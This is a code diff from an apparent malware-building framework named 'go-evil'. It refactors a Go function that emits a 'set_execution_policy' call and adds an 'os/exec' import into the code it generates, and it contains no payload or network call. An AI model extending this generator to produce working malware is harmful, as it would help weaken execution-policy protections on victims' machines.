@@ -3,14 +3,13 @@ package policy
 import (
 	"fmt"
 
-	"github.com/TeamPhoneix/go-evil/utility/structure"
 	"github.com/TeamPhoneix/go-evil/utility/structure/functions"
+	"github.com/TeamPhoneix/go-evil/utility/structure/json"
 	"github.com/TeamPhoneix/go-evil/utility/tools"
 	"github.com/s9rA16Bf4/notify_handler/go/notify"
 )
 
-func Set_execution(value string, s_json string) ([]string, string) {
-	data_object := structure.Receive(s_json)
+func Set_execution(value string, data_object *json.Json_t) []string {
 	value = tools.Erase_delimiter(value, []string{"\""}, -1)
 
 	function_call := "set_execution_policy"
@@ -40,5 +39,5 @@ func Set_execution(value string, s_json string) ([]string, string) {
 	data_object.Add_go_import("os/exec")
 	parameter_1 := data_object.Generate_int_array_parameter(value)
 
-	return []string{fmt.Sprintf("%s(%s)", function_call, parameter_1)}, structure.Send(data_object)
+	return []string{fmt.Sprintf("%s(%s)", function_call, parameter_1)}
 }
